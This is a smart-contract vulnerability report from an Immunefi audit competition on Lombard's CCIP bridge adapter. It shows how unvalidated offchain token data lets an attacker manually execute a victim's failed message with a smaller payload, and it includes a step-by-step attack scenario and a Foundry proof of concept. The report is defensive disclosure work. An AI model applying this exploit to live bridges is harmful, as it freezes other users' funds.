# #38154 \[SC-Medium] The offchain data provided to the CLAdapter isn’t properly validated and can be f

**Submitted on Dec 26th 2024 at 11:28:12 UTC by @iamandreiski for** [**Audit Comp | Lombard**](https://immunefi.com/audit-competition/audit-comp-lombard)

* **Report ID:** #38154
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/lombard-finance/evm-smart-contracts/blob/main/contracts/bridge/adapters/CLAdapter.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol (not lower than $1K))

## Description

## Brief/Intro

CLAdapter/Token Pools use CCIP’s `offchainTokenData` parameter in order to fetch the payloadHash and the proof so that the source-burned LBTC is minted to the user on destination.

The problem is that during the execution of the CCIP messages, the offchain data (which is not part of the CCIP message) is never validated against the data from the actual CCIP message to make sure that the amount/extraData of the CCIP message matches the payload in the offchain data.

During a manual execution of a failed CCIP message in the offRamp, a malicious actor can exploit the above-mentioned scenario by attaching offchain data coming from a different unrelated Lombard bridging message with the CCIP message of the victim, resulting in the following possible outcomes:

* The victim receiving significantly less LBTC than they were supposed to as the amount is based on the offchain data;
* The original message of the victim that was used in the execution in conjunction with the “malicious” offchain data will be marked as `SUCCESS` and can no longer be re-executed;
* The original funds that the victim was supposed to receive will be frozen;

## Vulnerability Details

A malicious actor can take advantage of the lack of validation to execute one message’s offchain data with another non-related message, outlined later in this report in greater detail.

But first, in order to fully grasp the root cause of this issue, Let's briefly look into how CCIP’s onRamp and offRamp operate when combined with the architecture of the LBTC bridge.

When a user decides to perform a cross-chain transfer of LBTC from one chain to another using LBTC’s bridge (which has CCIP attached as a form of 2FA), there are two paths which the user can take:

* Starting the bridging process via the LBTC Bridge contract’s `deposit` function which will later invoke the `ccipSend` function on the CCIP router;
* The second path is starting the bridging process directly through the `ccipSend` function on the CCIP router, which will access the CLAdapter and Bridge through the token pool’s `lockOrBurn` function;

In both of the above-mentioned scenarios, the constructed payload which is returned from the token pool in the form of `poolReturnData.destPoolData` is stored as part of the `EVM2AnyTokenTransfer.extraData` argument in the greater `EVM2AnyRampMessage` which is used to be processed and then delivered in the offRamp on the destination chain.

* The construction of the payload:

```solidity
 function _deposit(DestinationConfig memory config, bytes32 toChain, bytes32 toAddress, uint64 amount)
        internal
        returns (uint256, bytes memory)
    {
    ...
    // prepare bridge deposit payload
        bytes memory payload = abi.encodeWithSelector(
            Actions.DEPOSIT_BRIDGE_ACTION,
            bytes32(block.chainid),
            bytes32(uint256(uint160(address(this)))),
            toChain,
            config.bridgeContract,
            toAddress,
            amountWithoutFee,
            $.crossChainOperationsNonce++
        );
```

* The said payload is fetched by the token pools so that it can be used as the return data from the pool’s `lockOrBurn` function:

```solidity
 function lockOrBurn(
        Pool.LockOrBurnInV1 calldata lockOrBurnIn
    ) external virtual override returns (Pool.LockOrBurnOutV1 memory) {
       ...
        (uint256 burnedAmount, bytes memory payload) = adapter.initiateDeposit(
            lockOrBurnIn.remoteChainSelector,
            lockOrBurnIn.receiver,
            lockOrBurnIn.amount
        );

    ...
        return
            Pool.LockOrBurnOutV1({
                destTokenAddress: getRemoteToken(
                    lockOrBurnIn.remoteChainSelector
                ),
                destPoolData: destPoolData
            });
    }
```

* The return data coming from the Token Pool is stored in the CCIP message’s `extraData` as part of the onRamp logic.
* Here’s the onRamp (part of the CCIP system) storing the return data as `extraData`:

```solidity
    Pool.LockOrBurnOutV1 memory poolReturnData = sourcePool.lockOrBurn(
      Pool.LockOrBurnInV1({
        receiver: receiver,
        remoteChainSelector: destChainSelector,
        originalSender: originalSender,
        amount: tokenAndAmount.amount,
        localToken: tokenAndAmount.token
      })
    );

    return Internal.EVM2AnyTokenTransfer({
      sourcePoolAddress: address(sourcePool),
      destTokenAddress: poolReturnData.destTokenAddress,
      extraData: poolReturnData.destPoolData,
      amount: tokenAndAmount.amount,
      destExecData: "" // This is set in the processPoolReturnData function
    });
  }
```

* To elaborate further, after the necessary checks, the message is processed through the CCIP system and forwarded to the offRamp (CCIP endpoint on destination). The offRamp forwards the following data to the token pool for further validation:

```solidity
    (bool success, bytes memory returnData, uint256 gasUsedReleaseOrMint) = CallWithExactGas
      ._callWithExactGasSafeReturnData(
      abi.encodeCall(
        IPoolV1.releaseOrMint,
        Pool.ReleaseOrMintInV1({
          originalSender: originalSender,
          receiver: receiver,
          amount: sourceTokenAmount.amount,
          localToken: localToken,
          remoteChainSelector: sourceChainSelector,
          sourcePoolAddress: sourceTokenAmount.sourcePoolAddress,
          sourcePoolData: sourceTokenAmount.extraData,
          offchainTokenData: offchainTokenData
        })
      ),
      localPoolAddress,
      gasLeft,
      Internal.GAS_FOR_CALL_EXACT_CHECK,
      Internal.MAX_RET_BYTES
    );
```

* First issue which makes this attack vector plausible is the lack of offchain token data validation within the CCIP system. The offchain data used to execute a certain report doesn’t have to “belong” to that report/message, i.e. it can be arbitrary. When manually executing a message in the CCIP offRamp, a user passes the “report”(which is the actual CCIP message) and arbitrary offchain data which doesn’t have to belong to that report (or to any for that matter), it’s up to the token pool to validate it.
* Second one, and the actual vulnerability within the Lombard architecture is that the offchain data is never validated against other contents of the CCIP message, specifically `sourcePoolData: sourceTokenAmount.extraData` which is where the payload was stored on the source chain when passed to the onRamp (as outlined previously in this report). By not validating the offchain data passed to the token pool against the `extraData` argument of the CCIP message, we’re allowing the usage of one CCIP message with an offchain data from another un-related Lombard CCIP message.

Representation of the manual execution on the offRamp including how offchain data can be arbitrary, is separate from the actual messages and is never properly validated:

```solidity
function manuallyExecute(
    Internal.ExecutionReportSingleChain[] memory reports,
    GasLimitOverride[][] memory gasLimitOverrides
  ) external
  
  //The ExecutionReportSingleChain struct:
  
   struct ExecutionReportSingleChain {
    uint64 sourceChainSelector; // Source chain selector for which the report is submitted
    Any2EVMRampMessage[] messages;
    // Contains a bytes array for each message, each inner bytes array contains bytes per transferred token
    bytes[][] offchainTokenData;
    bytes32[] proofs;
    uint256 proofFlagBits;
  }
  
  // Checks performed in regards to the offchainTokenData
  
  uint256 numMsgs = report.messages.length;
  if (numMsgs != report.offchainTokenData.length) revert UnexpectedTokenData();
  
  bytes[] memory offchainTokenData = report.offchainTokenData[i];
      if (message.tokenAmounts.length != offchainTokenData.length) {
        revert TokenDataMismatch(sourceChainSelector, message.header.sequenceNumber);
              }           
```

LBTC’s token pool, takes the offchain data as the source that contains the payload and the proof from the notary system so that the tokens can be minted on destination:

```solidity
 function releaseOrMint(
        Pool.ReleaseOrMintInV1 calldata releaseOrMintIn
    ) external virtual override returns (Pool.ReleaseOrMintOutV1 memory) {
        _validateReleaseOrMint(releaseOrMintIn);

        uint64 amount = adapter.initiateWithdrawal(
            releaseOrMintIn.remoteChainSelector,
            releaseOrMintIn.offchainTokenData
        );

        emit Minted(msg.sender, releaseOrMintIn.receiver, uint256(amount));

        return Pool.ReleaseOrMintOutV1({destinationAmount: uint256(amount)});
    }
```

After the initiateWithdrawal is invoked on the CLAdapter it will “deconstruct” the offchain data, authenticate it through the notary and then “withdraw”/mint the funds from the bridge:

```solidity
  function initiateWithdrawal(
        uint64 remoteSelector,
        bytes calldata offChainData
    ) external onlyTokenPool returns (uint64) {
        (bytes memory payload, bytes memory proof) = abi.decode(
            offChainData,
            (bytes, bytes)
        );

        _receive(getChain[remoteSelector], payload);
        bridge.authNotary(payload, proof);
        return bridge.withdraw(payload);
    }
```

Based on the offchain data provided in the releaseOrMint call (after being notarized), a certain amount of tokens will be minted to the recipient:

```solidity
    function withdraw(bytes calldata payload) external nonReentrant returns (uint64) {
        BridgeStorage storage $ = _getBridgeStorage();

       ...

        if (destConf.requireConsortium && !depositData.notarized) {
            revert ConsortiumNotConfirmed();
        }

        // proof validation
        if (depositData.withdrawn) {
            revert PayloadAlreadyUsed(payloadHash);
        }

        depositData.withdrawn = true;

        lbtc().mint(action.recipient, action.amount);

        return action.amount;
    }
```

The amount minted to the recipient (`action.amount`) is the amount which the `releaseOrMint` call returns to the offRamp, so that the offRamp can perform further security checks on said amount.

Since the amount returned from the `releaseOrMint` is taken from the malicious offchain data, that is the amount that the offRamp will use to perform the following check to make sure that the recipient actually received the tokens:

```solidity
    if (receiver != localPoolAddress) {
      (uint256 balancePost,) = _getBalanceOfReceiver(receiver, localToken, gasLeft - gasUsedReleaseOrMint);

      // First we check if the subtraction would result in an underflow to ensure we revert with a clear error
      if (balancePost < balancePre || balancePost - balancePre != localAmount) {
        revert ReleaseOrMintBalanceMismatch(localAmount, balancePre, balancePost);
      }
    }
```

This will result in the CCIP message of the victim being marked as `SUCCESS` and not being able to be executed again.

A malicious user can take advantage of the above-mentioned discourse to execute the CCIP message of the victim with another carefully crafted offchain data which has the same recipient so that the offRamp's security checks could pass, but a significantly lower amount.

Let's explore the following hypothetical scenario:

1. Alice wants to bridge $100,000 worth of LBTC from Chain A to Chain B and initiates the CCIP bridge transaction. After both the CCIP system processes the message and the notarization system signs off on the transaction, the CCIP DON (Decentralized Oracle Network) will try to execute the message.
2. The message results in a failure and would have to be manually executed. This can be due to a multitude of reasons such as:
   1. The provided gas amount wasn’t enough and the call reverts on destination → custom gas amounts can be utilized if `ccipSend` is directly called, rather than going through the Bridge.sol flow.
   2. Call was initiated through ccip and contains an arbitrary contract call which reverted the first time it was tried out;
   3. The general/global rate limits on the offRamp were currently saturated so the call failed;
   4. Lombard rate limits are currently saturated and the call failed; (This can also be caused by a malicious user as well)
   5. The source or destination chain was “cursed” (Chainlink team curses chains in case they have certain problems (like sequencer downtime or similar), so the message was marked as `FAILURE` and would have to be retried manually;
3. Prior to this, Bob has also “bridged” a legitimate message to Alice for $50 worth of LBTC (sum is arbitrary, can be more or less), but he constructed the message so it intentionally reverts when CCIP tries to execute it (it has an arbitrary call to a contract which always reverts), and the notarization system signed this message as well (since it was a legitimate transaction).
4. Once Alice’s message failed and was marked as `FAILURE` (another point which enables manual execution is, if the message was committed 8+ hours ago and DON still hasn’t executed it), Bob can now coordinate his attack.
5. Bob takes Alice’s CCIP message and the offchain data from Bob’s message ($50 LBTC bridge), and manually executes it.
6. Since the Lombard bridge only takes into consideration the offchain data, the bridge will mint $50 worth of LBTC to Alice (due to using Bob’s offchain data), while at the same time marking Alice’s CCIP message as `SUCCESS` .
7. Since the receiver in both cases was Alice (offchain data and CCIP message), the check from Alice’s CCIP message which makes sure that Alice’s balance has increased for a given amount will pass, as the amount for which is checked is the one returned from the `releaseOrMint` call and the token pool fetches it from the offchain data (i.e. $50 worth of LBTC).
8. Alice’s CCIP message will be no longer executable due to it being marked as `SUCCESS` ; while at the same time the $100,000 worth of LBTC was burned on source.
9. This causes the $100,000 worth of LBTC to be “frozen” as they were never minted on destination.

* Additional points to the above-scenario which could amplify the intentional nature of the attack is Bob having another "sleeper" message (waiting to be manually executed on destination) so that he intentionally saturates the limits causing Alice's message to fail so that it must be manually executed (this can be a large sum made to from Bob to Bob).
* Another point to the impact of this attack is if it's coordinated right before a Validator Set change (i.e. epoch change) so that the delay of the message causes the new validator set to be unable to prove the unused offchain data, rendering it unusable as well, besides the unusable CCIP message.

## Impact Details

Due to the lack of verification on the offchain data with the contents of the CCIP message, a malicious actor can purposefully exploit this to cause the freezing of funds of a victim, by executing their original message with another offchain data containing a lesser amount, while at the same time causing the original CCIP message to be unusable.

## References

Examples of manual execution on different offRamps (you can find such on any live offRamp).

* <https://basescan.org/tx/0x37f0d904050a6abafbd76cbbb1f34be2a2f778127df11d64f0a1a2f1446889f2>
* <https://etherscan.io/tx/0xbe9d8ff89974d41501cd141d981e66853ad21829aef78bd4b3dd864fccf7e5ac>

## Link to Proof of Concept

<https://gist.github.com/iamandreiski/237da9c07e33968ff98de61b720b9845>

## Proof of Concept

## Proof of Concept

The gist attached to this report contains a modified mock CCIP router so that it can simulate manual execution.

The below is a foundry/solidity version of a PoC which can be integrated with the already existing test suite (after foundry is integrated into the project).

It's a simplified version of the above-mentioned attack scenario:

```solidity

//SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {MockCCIPRouter} from "../contracts/mock/CCIPMocks.sol";
import "../contracts/mock/LBTCMock.sol";
import "../contracts/mock/ConsortiumMock.sol";
import "../contracts/bridge/Bridge.sol";
import {CLAdapter} from "../contracts/bridge/adapters/CLAdapter.sol";
import {LombardTokenPool} from "../contracts/bridge/adapters/TokenPool.sol";
import {Test, console} from "../lib/forge-std/src/Test.sol";
import "../node_modules/@chainlink/contracts-ccip/src/v0.8/ccip/test/mocks/MockRMN.sol";
import "../contracts/libs/RateLimits.sol";

contract PoC is Test {
    address alice = makeAddr("Alice");
    address bob = makeAddr("Bob");
    address owner = makeAddr("owner");
    address treasury = makeAddr("treasury");

    MockCCIPRouter ccipRouter;
    LBTCMock lbtc;
    ConsortiumMock consortium;
    Bridge bridge;
    CLAdapter adapter;
    MockRMN rmn;

    function setUp() public {
        vm.startPrank(owner);
        lbtc = new LBTCMock();
        bridge = new Bridge();
        ccipRouter = new MockCCIPRouter();
        consortium = new ConsortiumMock();
        rmn = new MockRMN();

        //Initialize contracts
        bridge.initialize(lbtc, treasury, owner);

        //CLAdapter deployment
        address[] memory allowList = new address[](0);
        adapter = new CLAdapter(bridge, 200_000, address(ccipRouter), allowList, address(rmn));

        //Mint tokens
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);

        lbtc.mintTo(alice, 10_0000_0000);
        lbtc.mintTo(bob, 10_0000_0000);

        //Initialize Settings

        bytes32 encodedBridge = bytes32((uint256(uint160(address(bridge)))));
        bridge.addDestination(bytes32(block.chainid), encodedBridge, 100, 0, adapter, true);
        RateLimits.Config memory rates = RateLimits.Config(bytes32(block.chainid), 1_0000_0000, 100);
        RateLimits.Config[] memory configs = new RateLimits.Config[](1);
        configs[0] = rates;
        bridge.setRateLimits(configs, configs);
        adapter.setRemoteChainSelector(bytes32(block.chainid), 2);

        vm.stopPrank();
    }

    function test_invalidOffchainData() public {
        //Alice bridges funds to herself
        vm.startPrank(alice);

        uint256 aliceBalanceBeforeBridge = lbtc.balanceOf(alice);
        console.log("Alice Balance before depositing: ", aliceBalanceBeforeBridge);

        bytes32 toChain = bytes32(block.chainid);
        bytes32 toAddress = bytes32(uint256(uint160(alice)));
        uint64 amount1 = 50_000_000;

        lbtc.approve(address(bridge), amount1);
        bridge.deposit(toChain, toAddress, amount1);

        vm.stopPrank();

        uint256 aliceBalanceAfterBridge = lbtc.balanceOf(alice);
        console.log("Alice Balance after depositing: ", aliceBalanceAfterBridge);

        //Bob creates a dummy transaction to bridge a small amount of assets to Alice

        vm.startPrank(bob);

        bytes32 toChain1 = bytes32(block.chainid);

        //Alice is again the receiver because the offRamp performs checks whether the receiver from the actual CCIP message received the amount returned from the Token Pool. Since the token pool returns the amount fetched from the offchain data, Alice will receive Bob's amount.

        bytes32 toAddress1 = bytes32(uint256(uint160(alice)));
        uint64 amount2 = 1_000;

        lbtc.approve(address(bridge), amount2);
        bridge.deposit(toChain1, toAddress1, amount2);

        vm.stopPrank();

        //Dummy offchain data representing the "amount and receiver"
        bytes memory aliceData = abi.encode(amount1, alice);
        bytes memory bobData = abi.encode(amount2, alice);

        //Fetching the stored msgIds for manual retrial
        bytes32 msgIdAlice = ccipRouter.getMsgId(alice);
        bytes32 msgIdBob = ccipRouter.getMsgId(bob);

        //Bob will maliciously execute Alice's message with his offchain data, rendering her message non-executable and the funds frozen;

        vm.startPrank(bob);

        ccipRouter.manuallyExecute(msgIdAlice, bobData);

        vm.stopPrank();

        uint256 aliceBalanceMaliciousMessage = lbtc.balanceOf(alice);
        console.log("Alice Balance after malicious message executed: ", aliceBalanceMaliciousMessage);

        //Alice tries to execute her own message, but it falis as it was already executed:

        vm.startPrank(alice);

        vm.expectRevert();
        ccipRouter.manuallyExecute(msgIdAlice, aliceData);

        vm.stopPrank();

        //Bob's message can't be used to execute alice's offchain data as he included additional data in the message that should be routed to him (via offRamp) which reverts when the offRamp calls the interface on his address;
    }
}

```
